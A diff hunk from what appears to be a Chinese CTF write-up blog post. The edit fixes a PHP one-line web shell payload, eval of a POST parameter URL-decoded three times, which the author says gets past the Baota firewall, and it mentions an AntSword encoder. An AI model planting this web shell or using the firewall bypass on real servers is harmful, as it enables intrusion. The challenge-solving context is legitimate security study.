@@ -110,7 +110,7 @@
 <img src="https://guokeya.github.io/post-images/1602149141409.png" alt="" loading="lazy"><br>
 可以看到根目录有/readflag。那么还是嘚想办法执行命令<br>
 这里GS大师傅发现。用URL编码3次。宝塔就不会拦截。可以动态执行命令<br>
-直接传个<code>eval(urlencode(urlencode(urlencode($_POST[1]))));</code>即可<br>
+直接传个<code>eval(urldecode(urldecode(urldecode($_POST[1]))));</code>即可<br>
 然后蚁剑写个编码器。同样编码三次</p>
 <pre><code>/**
  * php::base64编码器
